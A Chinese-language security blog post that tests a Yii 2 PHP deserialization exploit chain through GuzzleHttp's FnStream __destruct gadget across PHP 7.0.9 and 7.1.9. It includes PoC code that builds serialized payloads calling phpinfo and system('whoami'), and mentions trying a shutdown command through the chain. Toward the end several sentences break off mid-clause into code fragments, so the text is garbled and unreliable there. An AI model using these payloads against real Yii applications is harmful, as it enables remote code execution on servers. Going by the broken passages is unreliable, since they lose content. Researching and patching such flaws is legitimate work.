前言
本篇文章由 Yii 2.0.35 反序列化漏洞复现到新利用链发现 中发现的新利用连的坑展开的测试. 结果在最后
面
我在文章中提到， poc 加上 phpinfo 才能执行成功.  我当时的猜测是因为 phpinfo 函数执行的回显内容
过大出发了分段传输导致的.
然后我就展开了测试,  测试环境: phpstudy, PHP 7.0.9
利用链调整
文章发出后才发现, 调试时发现利用链中的第二节: \vendor\guzzlehttp\psr7\src\FnStream.php  中
的 __destruct()  (对象销毁时)魔术方法就存在危险函数且参数可控, 所以使用这条利用链不需要经过 
\vendor\yiisoft\yii2\db\BatchQueryResult.php
测试是否与分块传输有关
像上篇文章一样执行放大危害的操作，此时执行报错了. 由于报错回显的信息也非常大，所以依然是分块
传输, 因此执行结果不受分块传输的影响, 
// 控制 $this->_fn_close 为 phpinfo
public function __destruct() {
    if (isset($this->_fn_close)) {
        call_user_func($this->_fn_close);
    }
}
// 执行成功后, 同时也会触发 FnStream 的 __wakeup (反序列化时)魔术方法
public function __wakeup() {
    throw new \LogicException('FnStream should never be unserialized');
}
但如果回显内容过少也会影响到执行. 以 whoami 为例. 我以为只是没有回显. 所以我尝试了 shutdown -
t 0 /s  并没有执行. ipconfig /all  正常回显.  所以与回显内容长度有关.
单单根据回显顺的情况，程序的执行顺序像是先执行 __destruct()  然后再执行 __wakeup()  的
测试是否受PHP版本影响
调整 PHP 版本为 7.1.9 , 使用以下 poc , 进行测试
执行失败了!!!!. 
namespace GuzzleHttp\Psr7 {
    class FnStream {
        var $_fn_close;
        function __construct() {
            $this->_fn_close = "phpinfo";
        }
    }
    $b = new FnStream();
    echo(urlencode(serialize($b)));
}
于是我打开了 debug 进行测试. 调试低版本至 7.0.9 的时候我惊奇的发现. 顺序是先到 __wakeup()  执
行 throw new Exception()
 之后 居然正常执行了 __destruct()  !
当我将PHP版本调整至 7.1.9 就不行了，也就是说！PHP 版本 _fn_close)) {
            eval($this->_fn_close);
        }
    }
    public function __wakeup()
    {
        throw new \LogicException('FnStream should never be unserialized');
    }
}
var_dump(unserialize('O:8:"FnStream":2:
{s:9:"_fn_close";s:17:"system(\'whoami\');";}'));
当我将版本调至 PHP 版本 7.1.9，执行结果就只有 false. 且 xdebug 时 console 没有报错信息. 代码也直
接终止了.
官方修复
Yii 2.0.39 已经开始对 PHP 版本进行限制，已无法使用该方法绕过, 设置 cookieValidationKey, 复制 
TestController.php 后. 再次尝试.
而且语法也采用了高版本的写法. 强制使用其框架的应用跑在高版本的 PHP 服务上.
总结
Yii 修复版本后 2.0.38 可以利用 PHP _fn_close = "phpinfo";
        }
    }
    $b = new FnStream();
    echo(serialize($b));
}